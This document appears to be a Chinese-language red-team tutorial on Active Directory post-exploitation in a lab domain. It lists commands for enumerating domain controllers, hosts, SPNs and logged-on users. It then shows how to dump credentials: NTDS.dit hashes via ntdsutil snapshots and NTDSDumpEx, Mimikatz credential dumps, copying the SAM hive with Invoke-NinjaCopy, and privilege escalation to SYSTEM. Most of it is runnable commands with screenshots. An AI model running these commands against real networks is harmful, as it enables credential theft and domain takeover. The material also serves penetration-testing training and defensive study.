# 域内信息收集

#### 工具使用 <a id="-"></a>

**Nslookup**

```text
nslookup                               # 进入交互式界面
set type=all                           # 设置记录类型，可以设置为srv
_ldap._tcp.dc._msdcs.school.com        # 执行查询
```

![](https://p408.ssl.qhimgs4.com/t01be3de08f6804bad5.png)

**ADFind.exe**

**列出域控列表**

```text
Adfind.exe -sc dclist
```

![](https://p408.ssl.qhimgs4.com/t01934a50207fb10678.png)

**查询域中活动的主机,输出主机名和域名**

```text
AdFind.exe -sc computers_active name dnshostname
```

![](https://p408.ssl.qhimgs4.com/t016559ab85e7c1be09.png)

**查询域中活动的主机详细信息**

```text
AdFind.exe -b dc=school,dc=com -f "objectcategory=computer"
```

**查询域管理员账户（未成功）**

```text
AdFind.exe -b cn="domain admins",dc=school,dc=com member
```

![](https://p408.ssl.qhimgs4.com/t01f999bfe7d660d9ee.png)

**从结果中筛选出SPN及域名**

```text
Adfind -sc computers_active servicePrincipalName dnshostname
```

![](https://p408.ssl.qhimgs4.com/t01e21125130370470c.png)

![](https://p408.ssl.qhimgs4.com/t013bc5019cd01ba979.png)

**PVEFindADUser.exe**

**显示每台计算机上登录的用户**

```text
PVEFindaduser -current  -noping
```

![](https://p408.ssl.qhimgs4.com/t01718b25eda524998e.png)

**查看192.168.111.251主机上登录的用户**

```text
PVEFindADuser  -current  -target 192.168.111.251
```

![](https://p408.ssl.qhimgs4.com/t01a72d1219bdf9e1a7.png)

**查看每台计算机上次登录的用户**

```text
PVEFindADuser  -last
```

![](https://p408.ssl.qhimgs4.com/t017339458e67628760.png)

**Netview.exe**

![](https://p408.ssl.qhimgs4.com/t0118f9037e8d094793.png)

**Netsess.exe**

![](https://p408.ssl.qhimgs4.com/t01f6e81c4b91af191c.png)

**csvde.exe （域控）**

**在域控上使用csvde导出用户信息、域成员主机信息，域管理员信息**

用户信息：

![](https://p408.ssl.qhimgs4.com/t01fbc8f88fe54d5e34.png)

域成员主机信息：

![](https://p408.ssl.qhimgs4.com/t01eecfee255fab0df7.png)

域管理员信息：

![](https://p408.ssl.qhimgs4.com/t01bc155610307cec6a.png)

#### 导出域控中用户HASH <a id="-hash"></a>

**ntdsutil**

```text
ntdsutil snapshot "activate instance ntds" create quit quit
```

![](https://p408.ssl.qhimgs4.com/t01ee3b30ebdf8690a9.png)

```text
ntdsutil snapshot "mount {GUID}" quit quit
```

![](https://p408.ssl.qhimgs4.com/t01cf7745994c6d1b89.png)

将文件复制出来

![](https://p408.ssl.qhimgs4.com/t015e8df8bfa606b657.png)

```text
ntdsutil snapshot "unmount {GUID}" quit quit
ntdsutil snapshot " delete {GUID} " quit quit
```

![](https://p408.ssl.qhimgs4.com/t01fe021e53e226cb75.png)

**Ntdsdumpex.exe**

域控上运行：

```text
Ntdsdumpex.exe -r -d C:\temp\ntds.dit –o hash.txt
```

![](https://p408.ssl.qhimgs4.com/t01e615aa5c29e7b48e.png)

本地运行：

```text
Ntdsdumpex.exe -r
```

![](https://p408.ssl.qhimgs4.com/t01696dad547346bb00.png)

```text
NTDSDumpEx.exe -k 4D54B7E7F7C6541D4FF486B8A83DC5B1 -d ntds.dit -o hash.txt
```

#### Powershell使用 <a id="powershell-"></a>

**PowerSploit**

**Invoke-Mimikatz（依赖管理员）**

```text
Import-Module .\invoke-mimikatz.ps1
Invoke-Mimikatz –DumpCreds
```

![](https://p408.ssl.qhimgs4.com/t017708ff8b64222255.png)

使用Invoke-Mimikatz –command “mimikatz命令”来执行命令：

![](https://p408.ssl.qhimgs4.com/t01f16508152e83b83f.png)

**Invoke-Ninjacopy （依赖管理员）**

直接拷贝系统文件：

![](https://p408.ssl.qhimgs4.com/t01c50682002c2733c5.png)

```text
Import-Module .\invoke-ninjacopy.ps1
invoke-ninjacopy -Path C:\Windows\System32\config\SAM -LocalDestination C:\Users\linghuchong\Desktop\SAM
```

![](https://p408.ssl.qhimgs4.com/t0198f5583b84dba02c.png)

**Get-System \(依赖管理员\)**

![](https://p408.ssl.qhimgs4.com/t010b5eb6050f0694cd.png)

**Invoke-Portscan**

**扫描Top50端口：**

```text
Invoke-POrtscan –Hosts ip地址 –TopPorts 50
```

**扫描特定端口：**

```text
Invoke-Portscan –Hosts ip地址 –Ports 端口
```

![](https://p408.ssl.qhimgs4.com/t01be719435d7ec0785.png)

**Invoke-ReverseDnsLookup**

反向解析IP地址：

![](https://p408.ssl.qhimgs4.com/t0101abbf8514013e30.png)

**Invoke-Wmicommand**

![](https://p408.ssl.qhimgs4.com/t01ca6a1e87e5875386.png)

**PowerView**

**Get-NetDomain**

![](https://p408.ssl.qhimgs4.com/t013942e21dbea6aab9.png)

**Get-NetDomainController**

![](https://p408.ssl.qhimgs4.com/t01449c932a7ce0c2e2.png)

**Invoke-ProcessHunter –ProcessName 进程名**

![](https://p408.ssl.qhimgs4.com/t011f501d7648ecc9fd.png)

**Get-NetShare获取共享信息**

![](https://p408.ssl.qhimgs4.com/t016a895bef2666965a.png)

